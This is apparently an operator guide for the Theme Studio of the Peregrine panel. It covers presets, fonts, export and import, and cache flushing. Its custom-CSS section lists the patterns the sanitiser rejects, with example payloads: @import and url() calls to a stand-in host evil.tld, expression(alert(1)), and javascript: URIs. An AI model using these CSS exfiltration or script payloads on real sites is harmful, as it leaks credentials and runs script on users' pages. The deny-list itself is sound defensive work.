# Theme Studio

The Theme Studio is the main entry point for customising your Peregrine
panel's branding and look-and-feel. It is a full-screen React editor at
`/theme-studio` with live preview, accessible from
**Admin → Settings → Theme Settings → "Open Theme Studio"**.

This document is the operator guide. If you want to contribute to the
studio code itself, see the `## Theme Studio` section in the project's
`CLAUDE.md`.

- [Quick start](#quick-start)
- [Studio sections](#studio-sections)
- [Custom fonts](#custom-fonts)
- [Custom CSS — what is allowed](#custom-css--what-is-allowed)
- [Backups, export and import](#backups-export-and-import)
- [Cache flushing after a direct DB edit](#cache-flushing-after-a-direct-db-edit)
- [Troubleshooting](#troubleshooting)

## Quick start

1. Open `/admin/theme-settings` and click **Open Theme Studio**. The studio
   opens in a new tab.
2. Pick a **brand preset** in the first section (Orange, Amber, Crimson,
   Emerald, Indigo, Violet, Slate). The preview iframe on the right updates
   immediately.
3. Tweak any value — colours, sidebar widths, login template, hover
   intensity, custom CSS. Changes are live in the preview but **not
   persisted** until you click **Publish**.
4. Use the toolbar above the preview to switch **scenes** (dashboard,
   server overview, console, files, login, register…), **mode** (dark or
   light), and **breakpoint** (mobile, tablet, desktop). Test all scenes
   you care about before publishing.
5. Click **Publish** to commit the changes. The whole panel picks them up
   without a restart (cache is invalidated automatically).
6. If you regret a change, click **Discard** to roll back to the
   last-published state. **Reset to defaults** is the nuclear option —
   see [Reset semantics](#reset-semantics) below.

### Reset semantics

The Reset button is intentionally hard to trigger:

- It opens a modal with concrete warnings (length of your custom CSS,
  presence of uploaded login backgrounds).
- You must type the literal string `RESET` (uppercase) to enable the
  destructive button.
- It cannot be undone via the UI. **Always run `php artisan theme:export`
  first** if you want to keep the current configuration.

## Studio sections

| Section | What it controls |
|---|---|
| **Brand preset** | One-click swap of the brand colour set (primary / secondary / accents). Falls back to "Custom" once you tweak any colour individually. |
| **Brand colors** | The 4 brand-level colours (primary, primary hover, secondary, ring). |
| **Status colors** | Semantic colours for danger / warning / success / info / suspended / installing. |
| **Surfaces & borders** | Background, surface variants, borders, text hierarchy. |
| **Typography** | Font family + base radius + density (compact / comfortable / spacious). |
| **Layout shell** | Header height, sticky vs static, alignment, container max-width, page padding. |
| **Sidebar (in-server)** | Classic / rail / mobile widths, blur intensity, floating mode. |
| **Sidebar nav** | Position, style, per-entry visibility and order (legacy editor). |
| **Cards (server list)** | 14 card-style fields: visibility toggles, hover effect, sort/group, column counts per breakpoint. |
| **Login templates** | Centered / Split / Overlay / Minimal, plus background image / blur / pattern. Carousel mode rotates multiple images. |
| **Per-page overrides** | Console fullwidth / Files fullwidth / Dashboard 4-column expanded. |
| **Footer** | Toggle, free text, repeater of `{label, url}` link entries. |
| **Refinements** | Animation speed, hover scale, border width, glass blur, font size scale, app-wide background pattern. |
| **Custom CSS** | Free textarea injected into a single `<style>` element on every page. Sanitised — see below. |

## Custom fonts

The font dropdown ships with a curated list (Inter, Plus Jakarta Sans,
Space Grotesk, Sora, Outfit, IBM Plex Sans, Manrope, JetBrains Mono,
system-ui). Anything outside that list:

1. Type the exact Google Fonts family name in the dropdown's "Other"
   input. The studio accepts any value up to 64 characters.
2. On **Publish**, `ThemeProvider` injects a `<link rel="stylesheet"
   href="https://fonts.googleapis.com/css2?family=...">` into the
   document head. Multi-word names are URL-encoded automatically.
3. To self-host a font instead of using Google Fonts: place the
   `@font-face` declaration in **Custom CSS**, point `src: url(...)` to
   a path under `/storage/...` (you can upload font files via SFTP).
   Then set the font name in the dropdown to your declared family.

> Caveat: external `https://fonts.googleapis.com/...` requests are
> permitted because they are document-level `<link>` tags injected by
> Peregrine itself — the Custom CSS sanitiser only blocks `@import` and
> external `url()` *inside* the textarea.

## Custom CSS — what is allowed

Custom CSS is rendered through a single `<style>` element. To prevent
data exfiltration via `Referer` + cookie leaks (and legacy IE
script-execution vectors), the following patterns are **rejected at save
time** with a 422 validation error:

| Pattern | Rejected example | Why |
|---|---|---|
| `@import` | `@import url("https://evil.tld/x.css");` | Would issue a credentialed cross-origin fetch on every page render. |
| External `url(...)` | `background: url("https://evil.tld/x.png");` | Same exfiltration risk; `Referer` would carry the panel URL. |
| Protocol-relative `url(//...)` | `background: url("//evil.tld/x.png");` | Same risk under the active scheme. |
| `expression(...)` | `width: expression(alert(1));` | Legacy IE JavaScript-in-CSS execution. |
| `behavior:` | `behavior: url(xss.htc);` | Legacy IE binary behaviours. |
| `javascript:` URIs | `cursor: url(javascript:alert(1));` | Direct script execution attempt. |
| `<script` tags | `<script>...</script>` | A copy/paste accident pasting HTML into the textarea. |

Workarounds:
- Self-host the asset (drop it under `storage/app/public/branding/...`)
  and reference it as `url("/storage/branding/your-asset.png")`.
- For external fonts, use the dropdown (which uses a `<link>`, outside
  the sanitised textarea).

## Backups, export and import

The studio does not yet have a UI export. Use the Artisan CLI:

```bash
# Snapshot the current theme to a JSON file
php artisan theme:export --output=my-theme.json

# Apply an exported theme to this install
php artisan theme:import my-theme.json
# or skip the dry-run / confirmation:
php artisan theme:import my-theme.json --force
```

The JSON payload contains all `theme_*` settings + card config + sidebar
config + footer links. **Uploaded images are referenced by path, not
embedded.** A theme exported from one install will not bring its login
background image with it — copy the file under
`storage/app/public/branding/` separately if you need true portability.

## Cache flushing after a direct DB edit

If you edit the `settings` table directly (manual SQL, an
admin-as-tinker session, a backup restore), the studio will not reflect
the new values until the cache layer is flushed. The relevant cache
keys live under Redis (or the file driver in dev):

- `theme_full` — resolved theme structure (TTL 1h)
- `theme_css_vars` — emitted CSS variables (TTL 1h)
- `theme_mode_variants` — pre-computed `dark` and `light` payloads (TTL 1h)

The simplest way:

```bash
php artisan cache:clear
```

If you only want to invalidate the theme keys without nuking the rest:

```bash
php artisan tinker --execute="\
  Cache::forget('theme_full'); \
  Cache::forget('theme_css_vars'); \
  Cache::forget('theme_mode_variants');"
```

After a flush, the next request rebuilds the cache from the database.

## Troubleshooting

### "I see a white veil over the egg banner image in light mode"

Hard refresh the browser (`Cmd+Shift+R` / `Ctrl+Shift+R`) and verify the
three theme cache keys are clear. The banner overlay is hardcoded dark
in both modes (Steam / Spotify convention) — if you see a white wash,
your client is showing a stale `theme_mode_variants` payload.

### "The login carousel shows a black panel"

One of the paths in `theme_login_background_images` no longer exists on
disk (the file was deleted manually, or moved). The carousel pre-loads
each image on mount and silently drops the broken paths from the
rotation. If all paths fail, the gradient fallback renders.

To rebuild the list: open the studio, remove the broken entry from the
carousel section, re-publish.

### "I edited the theme but my preview doesn't follow"

Every consumer must read the theme through `useResolvedTheme()` (the
Context that `ThemeProvider` exposes). A consumer that does its own
`useQuery(['theme'])` will see the cached server response and miss the
postMessage updates from the studio iframe. If you wrote a custom
component that displays themed values, audit it for that anti-pattern.

### "Saving from `/admin/theme-settings` Filament page used to wipe my Vague 3 config"

That bug existed before May 2026 and is now fixed: the Filament save
loop skips keys that are not part of the form schema instead of nulling
them. If you are on an older deployment, upgrade — or temporarily save
**only via the Theme Studio** (`/theme-studio`), which has always been
defensive on this point.

### "Concurrent admins are overwriting each other"

The save endpoint uses optimistic locking via `theme_revision`. If two
admins open the studio at the same time and both publish, the second
one gets a `409 Conflict` and a banner inviting them to reload. The
revision integer is incremented on every save (studio + Filament +
reset).

### "I rolled back the migration; my theme is gone"

The seed migration's `down()` is intentionally a no-op — rolling back
must not destroy admin configuration. If you truly need a clean wipe,
either truncate `settings` directly or run `php artisan migrate:fresh
--seed`.
